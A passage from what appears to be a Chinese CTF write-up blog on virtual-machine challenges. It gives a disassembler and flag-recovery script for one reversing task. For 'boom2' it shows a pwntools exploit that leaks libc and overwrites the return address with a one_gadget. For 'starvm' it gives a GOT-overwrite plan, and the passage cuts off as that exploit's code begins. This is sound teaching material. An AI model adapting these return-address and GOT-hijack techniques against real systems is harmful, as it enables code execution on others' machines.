class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF6</span>, <span class="number">0xF7</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0D</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x13</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE1</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(opcode)):</span><br><span class="line"><span class="keyword">if</span> (opcode[i] == <span class="number">0xF1</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mov &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE1</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;eax &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE2</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ebx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE3</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ecx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE4</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;] &#x27;</span> + <span class="string">&#x27;eax&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE5</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;edx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line"><span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE7</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;] &#x27;</span> + <span class="string">&#x27;ebx&#x27;</span>)</span><br><span class="line">i += <span class="number">6</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF2</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;xor eax ebx&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF5</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF4</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF7</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mul eax edx&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF8</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;swap eax ebx&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">elif</span> (opcode[i] == <span class="number">0xF6</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;mov eax=3*eax+2*ebx+ecx&#x27;</span>)</span><br><span class="line">i += <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">i += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">mov eax flag[0]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[32] eax</span><br><span class="line">mov eax flag[1]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[33] eax</span><br><span class="line">mov eax flag[2]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[34] eax</span><br><span class="line">mov eax flag[3]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[35] eax</span><br><span class="line">mov eax flag[4]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[36] eax</span><br><span class="line">mov eax flag[5]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[37] eax</span><br><span class="line">mov eax flag[6]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[38] eax</span><br><span class="line">mov eax flag[7]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[39] eax</span><br><span class="line">mov eax flag[8]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[40] eax</span><br><span class="line">mov eax flag[9]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[41] eax</span><br><span class="line">mov eax flag[10]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[42] eax</span><br><span class="line">mov eax flag[11]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[43] eax</span><br><span class="line">mov eax flag[12]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[44] eax</span><br><span class="line">mov eax flag[13]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[45] eax</span><br><span class="line">mov eax flag[14]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[46] eax</span><br><span class="line">mov eax flag[15]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[47] eax</span><br><span class="line">mov eax flag[16]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[48] eax</span><br><span class="line">mov eax flag[17]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[49] eax</span><br><span class="line">mov eax flag[18]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[50] eax</span><br><span class="line">mov eax flag[19]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[51] eax</span><br><span class="line">nop</span><br><span class="line">#上面部分是误解</span><br><span class="line">read</span><br><span class="line"></span><br><span class="line">mov eax flag[0]</span><br><span class="line">mov ebx flag[1]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[0] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[1]</span><br><span class="line">mov ebx flag[2]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[1] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[2]</span><br><span class="line">mov ebx flag[3]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[2] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[3]</span><br><span class="line">mov ebx flag[4]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[3] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[4]</span><br><span class="line">mov ebx flag[5]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[4] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[5]</span><br><span class="line">mov ebx flag[6]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[5] eax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mov eax flag[6]</span><br><span class="line">mov ebx flag[7]</span><br><span class="line">mov ecx flag[8]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[6] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[7]</span><br><span class="line">mov ebx flag[8]</span><br><span class="line">mov ecx flag[9]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[7] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[8]</span><br><span class="line">mov ebx flag[9]</span><br><span class="line">mov ecx flag[10]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[8] eax</span><br><span class="line"></span><br><span class="line">mov eax flag[13]</span><br><span class="line">mov ebx flag[19]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[13] eax</span><br><span class="line">mov flag[19] ebx</span><br><span class="line"></span><br><span class="line">mov eax flag[14]</span><br><span class="line">mov ebx flag[18]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[14] eax</span><br><span class="line">mov flag[18] ebx</span><br><span class="line"></span><br><span class="line">mov eax flag[15]</span><br><span class="line">mov ebx flag[17]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[15] eax</span><br><span class="line">mov flag[17] ebx</span><br><span class="line">nop</span><br></pre></td></tr></table></figure><p>从读入长度以及0x2020a8引用判断下面部分才是真正的逆向块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_F00</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; dword_2022A4 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *((_BYTE *)qword_2022A8 + i) != byte_202020[i] )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正的加密逻辑:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;&#x27;</span>    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)：:</span><br><span class="line">    flag[i] = flag[i]^flag[i + <span class="number">1</span>]</span><br><span class="line">flag[<span class="number">6</span>] = (flag[<span class="number">8</span>]+<span class="number">2</span>*flag[<span class="number">7</span>]+<span class="number">3</span>*flag[<span class="number">6</span>])*flag[<span class="number">12</span>]</span><br><span class="line">flag[<span class="number">7</span>] = (flag[<span class="number">9</span>]+<span class="number">2</span>*flag[<span class="number">8</span>]+<span class="number">3</span>*flag[<span class="number">7</span>])*flag[<span class="number">12</span>]</span><br><span class="line">flag[<span class="number">8</span>] = (flag[<span class="number">10</span>]+<span class="number">2</span>*flag[<span class="number">9</span>]+<span class="number">3</span>*flag[<span class="number">8</span>])*flag[<span class="number">12</span>]</span><br><span class="line">swap(flag[<span class="number">13</span>], flag[<span class="number">19</span>])</span><br><span class="line">swap(flag[<span class="number">14</span>], flag[<span class="number">18</span>])</span><br><span class="line">swap(flag[<span class="number">15</span>], flag[<span class="number">17</span>])</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">check = [<span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>, <span class="number">0x5C</span>, <span class="number">0x72</span>,</span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>, <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>]</span><br><span class="line"></span><br><span class="line">check[<span class="number">13</span>], check[<span class="number">19</span>] = check[<span class="number">19</span>], check[<span class="number">13</span>]</span><br><span class="line">check[<span class="number">14</span>], check[<span class="number">18</span>] = check[<span class="number">18</span>], check[<span class="number">14</span>]</span><br><span class="line">check[<span class="number">15</span>], check[<span class="number">17</span>] = check[<span class="number">17</span>], check[<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">    <span class="keyword">if</span> check[<span class="number">8</span>] == ((i*<span class="number">3</span> + check[<span class="number">9</span>]*<span class="number">2</span> + check[<span class="number">10</span>])*check[<span class="number">12</span>])&amp;<span class="number">0xff</span>:</span><br><span class="line">        check[<span class="number">8</span>] = i</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            <span class="keyword">if</span> check[<span class="number">7</span>] == ((j * <span class="number">3</span> + check[<span class="number">8</span>] * <span class="number">2</span> + check[<span class="number">9</span>]) * check[<span class="number">12</span>]) &amp; <span class="number">0xff</span>:</span><br><span class="line">                check[<span class="number">7</span>] = j</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">                    <span class="keyword">if</span> check[<span class="number">6</span>] == ((k * <span class="number">3</span> + check[<span class="number">7</span>] * <span class="number">2</span> + check[<span class="number">8</span>]) * check[<span class="number">12</span>]) &amp; <span class="number">0xff</span>:</span><br><span class="line">                        check[<span class="number">6</span>] = k</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>)[::-<span class="number">1</span>]:</span><br><span class="line">    check[i] ^= check[i+<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(check)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(check[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="wdb-2020-1st-boom2"><a href="#wdb-2020-1st-boom2" class="headerlink" title="wdb_2020_1st_boom2"></a>wdb_2020_1st_boom2</h2><p>checksec</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/boom&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>ida打开发现存在类似平坦化混淆的东西</p><p>不过影响不大</p><p>申请了两个0x40000得堆块分别用作栈和数据缓冲区,并且初始化栈:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1        30</span><br><span class="line">2        13</span><br><span class="line">3        0</span><br><span class="line">4        真实栈地址</span><br><span class="line">5        虚拟栈地址</span><br></pre></td></tr></table></figure><p>vm题比较麻烦的点就是分析指令,以及确定各内存如何对应模拟环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">0 immcode: reg=[sp+immcode]</span><br><span class="line">1 immcode: reg=immcode</span><br><span class="line">6 immcode: push bp; bp=sp; sp-=immcode</span><br><span class="line">8 immcode: leave; ret</span><br><span class="line">9        : reg=[reg]</span><br><span class="line">10       : reg=char([reg])</span><br><span class="line">11       : [sp]=reg(int64)</span><br><span class="line">12       : [sp]=reg(byte)</span><br><span class="line">13       : push reg</span><br><span class="line">14       : [sp]=[sp] | reg</span><br><span class="line">15       : [sp]=[sp] ^ reg</span><br><span class="line">16       : [sp]=[sp] &amp; reg</span><br><span class="line">17       : [sp]=[sp] == reg</span><br><span class="line">18       : [sp]=[sp] != reg</span><br><span class="line">19       : [sp]=[sp] &lt; reg</span><br><span class="line">20       : [sp]=[sp] &gt; reg</span><br><span class="line">21       : [sp]=[sp] &lt;= reg</span><br><span class="line">22       : [sp]=[sp] &gt;= reg</span><br><span class="line">23       : [sp]=[sp] &lt;&lt; reg</span><br><span class="line">24       : [sp]=[sp] &gt;&gt; reg</span><br><span class="line">25       : [sp]=[sp] + reg</span><br><span class="line">26       : [sp]=[sp] - reg</span><br><span class="line">27       : [sp]=[sp] * reg</span><br><span class="line">28       : [sp]=[sp] / reg</span><br><span class="line">29       : [sp]=[sp] % reg</span><br><span class="line">30       : exit</span><br></pre></td></tr></table></figure><p>因为栈中存储有真实的栈地址,所以我们可以利用它来覆盖返回地址</p><p><strong>步骤:</strong></p><ol><li>首先进行一次pop将初始栈顶的bp pop出来,随便一个改变栈的指令就行</li><li>这时栈顶就是真实栈指针了，然后利用指令1将reg寄存器置为便宜0xe8，然后利用指令26，让栈指针减0xe8，并利用指令13将结果重新入栈</li><li>使用指令9取值，获取返回地址处的值（也就是libc_start_main+231的地址），并用13指令将获取到的值入栈</li><li>利用指令1将reg置为libc_start_main+231的偏移值offset，然后利用指令26让libc_start_main+231地址减偏移，得到libc的基址，并用13指令将获取到的libc基址入栈</li><li>利用指令1将reg置为onegadget的偏移offset，然后利用指令25计算出libc基址加onegadget偏移，也就是onegadget的地址</li><li>这时栈顶是之前步骤2入栈的返回地址指针，利用指令11将onegadget写入覆盖返回地址</li><li>然后直接发送即可。</li></ol><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc231=基址偏移</span><br><span class="line">onegadget=可用one_gadget</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">14</span>)  <span class="comment">#步骤1</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(<span class="number">0xe8</span>)+p64(<span class="number">26</span>)+p64(<span class="number">13</span>) <span class="comment">#步骤2</span></span><br><span class="line">payload+=p64(<span class="number">9</span>)+p64(<span class="number">13</span>)   <span class="comment">#步骤3</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(libc231)+p64(<span class="number">26</span>)+p64(<span class="number">13</span>) <span class="comment">#步骤4</span></span><br><span class="line"><span class="comment">#现在      stack    返回地址所在的栈</span></span><br><span class="line"><span class="comment">#                   libc基址</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)+p64(onegadget)+p64(<span class="number">25</span>) <span class="comment">#步骤5   reg=one_gadget</span></span><br><span class="line">payload+=p64(<span class="number">11</span>) <span class="comment">#步骤6</span></span><br><span class="line">p.send(payload) <span class="comment">#步骤7</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="starvm"><a href="#starvm" class="headerlink" title="starvm"></a>starvm</h2><p>vm类题</p><p>checksec,没有PIE利用会稍微简单一些</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/aichch/pwn/starvm&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure><p>代码有点难读,gdb动态调试参照</p><p>初始malloc申请了0x80的内存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0h   *code_begin</span><br><span class="line">8h   *code_end</span><br><span class="line">...  ??</span><br><span class="line">24h  *cost</span><br><span class="line">...  ??</span><br><span class="line">38h  regs(Dword)</span><br><span class="line">...</span><br><span class="line">70h  mem</span><br></pre></td></tr></table></figure><p>程序在读入command和cost后做出一些判断,然后进入虚拟机操作中</p><p>存在两个重要的变量分别负责指向当前code和当前cost</p><p>10号功能给寄存器赋值,溢出可以修改后面的mem指针</p><p>7号指令可以往mem指向处任意写,两者配合其他指令</p><p><strong>具体实施:</strong></p><ol><li>10号指令覆写mem指针为setvbuf的got表地址,利用减法得到system,利用7号指令将其修改</li><li>10号指令覆写mem指针为malloc的got表地址,7号指令将其写为调用setvbuf的地址</li><li>10号指令覆写mem指针为stdin的地址,将其修改为bss段上另一处地址,并在该处写上sh字符串</li><li>10号指令覆写mem指针为0使得再次调用相关功能时启用malloc,总而执行以上布置的执行流</li></ol><p>要注意指令是4字节Dword的,下标要对应</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 